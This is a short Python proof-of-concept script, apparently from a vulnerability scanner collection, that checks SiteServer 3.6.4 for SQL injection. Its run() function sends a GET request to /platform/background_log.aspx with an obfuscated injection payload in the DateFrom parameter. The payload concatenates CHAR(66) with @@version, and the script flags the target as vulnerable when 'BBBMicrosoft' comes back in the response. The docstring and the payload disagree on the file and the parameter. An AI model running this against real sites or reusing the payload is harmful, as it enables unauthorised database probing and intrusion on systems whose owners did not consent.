#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: siteserver3.6.4 background_log.aspx注入
referer: http://www.wooyun.org/bugs/wooyun-2013-043523
author: Lucifer
description: 文件/siteserver/service/background_taskLog.aspx中,参数Keyword存在SQL注入。
'''
import sys
import requests
import warnings
def run(url):
        result = ['siteserver3.6.4 background_log.aspx注入','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/platform/background_log.aspx?UserName=test&Keyword=1&DateFrom=20120101%27AnD/**/ChAr(66)%2BChAr(66)%2BChAr(66)%2B@@VeRsIoN>1/**/AnD%271%27=%271&DateTo=test"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"BBBMicrosoft" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result
if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])

